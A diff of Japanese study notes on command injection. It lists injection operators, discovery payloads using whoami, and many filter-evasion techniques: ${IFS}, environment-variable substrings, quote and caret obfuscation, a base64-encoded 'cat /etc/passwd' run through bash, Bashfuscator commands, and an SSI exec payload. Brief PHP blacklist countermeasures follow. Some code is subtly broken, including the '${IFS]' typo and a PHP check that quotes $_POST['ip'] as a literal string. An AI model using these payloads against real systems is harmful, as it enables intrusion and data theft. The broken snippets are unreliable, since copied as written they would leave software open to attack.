@@ -1,3 +1,16 @@
+//インジェクションに使用できる最も一般的な演算子のリスト
+SQL Injection	' , ; -- /* */
+Command Injection	; &&
+LDAP Injection	* ( ) & |
+XPath Injection	' or and not substring concat count
+OS Command Injection	; & |
+Code Injection	' ; -- /* */ $() ${} #{} %{} ^
+Directory Traversal/File Path Traversal	../ ..\\ %00
+Object Injection	; & |
+XQuery Injection	' ; -- /* */
+Shellcode Injection	\x \u %u %n
+Header Injection	\n \r\n \t %0d %0a %09
+
 //コマンドインジェクション脆弱性の発見
 curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami　#curlを利用してwhoamiの実行
 
@@ -8,6 +21,15 @@ ping #このコマンドは、アプリケーションをハングさせます�
 sleep #マシンにpingインストールされていない場合に、ブラインド コマンド インジェクションのアプリケーションをテストする際に役立つもう 1 つのペイロードです
 curl -H 'X-FORWARDED-FOR: ;<コマンド>;' --cookie "PHPSESSID=<cookie>" 'http://<IP>/target.php' #X-FORWARDEDを利用してコマンドの実行
 $(),` #サブシェル演算子やバックコートはUnixでしか使えない
+${IFS] #${IFS}をスペースが入るべき場所に使えば変数は自動的にスペースに置き換えられコマンドは機能するはず
+{ls,-la} #ブレースで囲えばカンマがスペース扱いされる
+${PATH:0:1} #環境変数で表示されるパスの０文字目から１文字目を表示することでスラッシュを表示する
+${LS_COLORS:10:1}　#環境変数を利用し；を表示する
+w"h"o"am"i　＃コマンドの難読化（引用符の数は偶数かつ種類を混ぜてはいけない）
+who$@ami #位置パラメーター文字$@での難読化
+ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #大文字、小文字を混ぜる難読化
+$(rev<<<'imaohw') #文字列の反転による難読化
+bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)　＃コマンドをbase64でエンコードしてからサブシェルで実行
 
 //windows
 whoami #アプリケーションがどのユーザーで実行されているかを確認します。
@@ -15,15 +37,45 @@ dir #現在のディレクトリの内容を一覧表示します。設定ファ
 ping #	このコマンドは、アプリケーションをハングさせます。これは、ブラインド コマンド インジェクションに対するアプリケーションのテストに役立ちます
 timeout #このコマンドは、アプリケーションをハングさせることもできます。また、pingコマンドがインストールされていない場合に、ブラインドコマンドインジェクションのアプリケーションをテストするのにも役立ちます
 ; #セミコロンはCMDなら使えないが、powershellなら使える
+%HOMEPATH:~6,-11%　＃スラッシュを生成（CMD）
+$env:HOMEPATH[0]　＃スラッシュを生成（powerShell)
+echo $(tr '!-}' '"-~'<<<:) #man asciiコマンドからアスキーコードを確認。この場合:の次の；が生成される
+who^ami #ハットでの難読化
+WhOaMi #大文字、小文字の混在による難読化
+iex "$('imaohw'[-1..-20] -join '')"　#文字列の反転による難読化
+
+//難読化ツール
+Bashfuscator　＃gitからクローンできる
+./bashfuscator -c 'コマンド'　＃ランダムな難読化手法が選択される
+./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1　＃デフォルトより短くてシンプルな難読化
 
 //対策
+#入力フォームから送信されたデータが数値であるかどうかを確認
 <?php
 if (!filter_input(INPUT_GET, "number", FILTER_VALIDATE_NUMBER)){
 }
-#入力フォームから送信されたデータが数値であるかどうかを確認
+
+#ブラックリストに登録された文字を検出
+$blacklist = ['&', '|', ';', ...SNIP...];
+foreach ($blacklist as $character) {
+    if (strpos($_POST['ip'], $character) !== false) {
+        echo "Invalid input";
+    }
+}
+
+#コマンド単位でブラックリストに登録
+$blacklist = ['whoami', 'cat', ...SNIP...];
+foreach ($blacklist as $word) {
+    if (strpos('$_POST['ip']', $word) !== false) {
+        echo "Invalid input";
+    }
+}
 
 //対策のバイパス
 "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" #引用符を１６進数に
+
+//WAFによる検知
+エラーメッセージが別のページを表示し、IPやリクエストの情報が表示された場合、WAFによって拒否された可能性がある
 
 //unixテクニック
 &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
